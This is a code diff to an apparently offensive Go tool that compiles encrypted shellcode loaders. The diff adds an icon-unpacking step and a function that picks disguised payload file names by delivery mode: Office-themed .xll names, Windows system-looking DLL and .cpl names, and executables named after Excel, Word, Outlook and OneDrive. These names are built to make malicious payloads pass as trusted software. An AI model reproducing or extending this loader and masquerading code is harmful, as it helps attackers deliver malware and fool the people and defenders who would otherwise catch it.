@@ -375,7 +375,48 @@ func CompileFile(shellcodeencoded string, b64ciphertext string, b64key string, b
 	code := MainFunction(shellcodeencoded, mode, console, exporttable, sandbox, process, encrypt, b64ciphertext, b64key, b64iv)
 	os.MkdirAll(outFile+"fldr", os.ModePerm)
 	Utils.Writefile(outFile+"fldr/"+outFile+".go", code)
+	Utils.B64decode("icons.zip")
+	Utils.Unzip("icons.zip", outFile+"fldr")
+	os.RemoveAll("icons.zip")
 	os.Chdir(outFile + "fldr")
 	fmt.Println("[+] Loader Compiled")
 	return outFile
+}
+
+func FileName(mode string) (string, string) {
+	var filename string
+	var name string
+	wscript := []string{"APMon", "bisrv", "btpanui", "certcli", "cmdext", "httpapi", "libcrypto", "netlogon", "tcpmon"}
+	dllname := []string{"apphelp", "bcryptprimitives", "cfgmgr32", "combase", "cryptsp", "dpapi", "sechost", "schannel", "urlmon", "win32u"}
+	cplname := []string{"appwizard", "bthprop", "desktop", "netfirewall", "FlashPlayer", "hardwarewiz", "inetcontrol", "control", "irprop", "game", "inputs", "mimosys", "ncp", "power", "speech", "system", "Tablet", "telephone", "datetime", "winsec"}
+	officename := []string{"Timesheet", "Reports", "Zoom", "Updates", "Calculator", "Calendar", "Memo", "Desk", "Appwiz"}
+	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}
+
+	if mode == "excel" {
+		name = officename[Utils.GenerateNumer(0, 9)]
+		filename = name + ".xll"
+	}
+	if mode == "control" {
+		name = cplname[Utils.GenerateNumer(0, 20)]
+		filename = name + ".cpl"
+	}
+	if mode == "wscript" {
+		name = wscript[Utils.GenerateNumer(0, 9)]
+		filename = name + ".dll"
+	}
+
+	if mode == "dll" {
+		name = dllname[Utils.GenerateNumer(0, 9)]
+		filename = name + ".dll"
+	}
+
+	if mode == "msiexec" {
+		name = dllname[Utils.GenerateNumer(0, 9)]
+		filename = name + ".dll"
+	}
+	if mode == "exe" {
+		name = Binaryname[Utils.GenerateNumer(0, 8)]
+		filename = name + ".exe"
+	}
+	return name, filename
 }
